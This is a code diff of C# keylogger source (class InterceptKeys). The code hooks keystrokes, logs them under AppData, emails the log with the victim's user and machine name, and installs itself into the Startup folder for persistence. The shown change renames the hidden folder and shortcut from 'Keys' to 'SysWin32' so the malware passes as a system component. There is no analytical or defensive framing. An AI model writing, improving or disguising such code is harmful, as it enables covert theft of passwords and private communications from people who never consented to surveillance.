@@ -91,12 +91,12 @@ class InterceptKeys
             writeLetter((Keys)vkCode);
 
             //Send log via email when it reaches a certain weight.
-            FileInfo logFile = new FileInfo(appData + @"\keys\log.txt");
+            FileInfo logFile = new FileInfo(appData + @"\SysWin32\log.txt");
             if (logFile.Exists && logFile.Length > 1000)
             {
                 sendmail(System.IO.File.ReadAllText(logFile.ToString()), senderEmail, receiverEmail, senderPassword);
                 string filename = "log_" + Environment.UserName + "@" + Environment.MachineName + "_" + DateTime.Now.ToString(@"MM_dd_yyyy_hh\hmm\mss") + ".txt";
-                logFile.MoveTo(appData + @"\keys\logs\" + filename);
+                logFile.MoveTo(appData + @"\SysWin32\logs\" + filename);
             }
         }
         return CallNextHookEx(_hookID, nCode, wParam, lParam);
@@ -110,15 +110,15 @@ class InterceptKeys
         string myPath = Application.ExecutablePath;
         string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
         string startupPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
-        string copyPath = appData + @"\Keys\" + Path.GetFileName(myPath);
+        string copyPath = appData + @"\SysWin32\" + Path.GetFileName(myPath);
 
-        Directory.CreateDirectory(appData + @"\Keys\");
-        Directory.CreateDirectory(appData + @"\Keys\logs\");
+        Directory.CreateDirectory(appData + @"\SysWin32\");
+        Directory.CreateDirectory(appData + @"\SysWin32\logs\");
 
         if (!System.IO.File.Exists(copyPath))
         {
             System.IO.File.Copy(myPath, copyPath);
-            CreateShortcut("Keys", startupPath, copyPath);
+            CreateShortcut("SysWin32", startupPath, copyPath);
         }
     }
 
@@ -168,7 +168,7 @@ class InterceptKeys
     private static void writeLetter(Keys key)
     {
         // Start writing to a file
-        StreamWriter sw = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\keys\log.txt", true);
+        StreamWriter sw = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\SysWin32\log.txt", true);
 
         // Create aliases for special characters to render properly in the logs
         var specialKeys = new Dictionary<string, string>()
